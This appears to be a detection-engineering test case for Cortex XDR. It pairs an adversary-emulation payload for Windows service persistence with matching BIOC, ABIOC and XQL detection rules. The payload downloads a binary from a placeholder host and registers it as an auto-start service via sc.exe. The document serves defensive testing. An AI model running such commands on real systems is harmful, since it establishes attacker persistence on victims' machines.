identity.description: An adversary uses sc.exe to create and start a new Windows service with an uncommon binary path to establish persistence. Cortex should detect this behavior via the ABIOC 'An uncommon service was started'.

techniques.name: Create or Modify System Process: Windows Service

payload.code:
mkdir C:\temp\malware
wget https://example.com/malware.exe -OutFile C:\temp\malware\malware.exe
stub C:\temp\malware\malware.exe
sc create MaliciousService binPath= "C:\temp\malware\malware.exe" start= auto
sc start MaliciousService

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Uncommon Service Binary Path
biocs.description: Detection of a service being started with a binary path that is not commonly seen in enterprise environments
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'sc.exe'
| filter action_file_path contains 'C:\\temp\\malware\\malware.exe'
| filter action_file_path not in (known_service_paths)

abiocs.name: An uncommon service was started
abiocs.description: Detection of a new service being started with a binary path that deviates from typical service binaries
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'sc.exe'
| filter action_file_path not in (known_service_paths)
| filter action_file_path contains 'C:\\temp\\malware\\malware.exe'

xql_queries.name: Uncommon Service Start Detection
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'sc.exe'
| filter action_file_path not in (known_service_paths)
| filter action_file_path contains 'C:\\temp\\malware\\malware.exe'
| fields agent_hostname, action_file_path, action_process_image_name
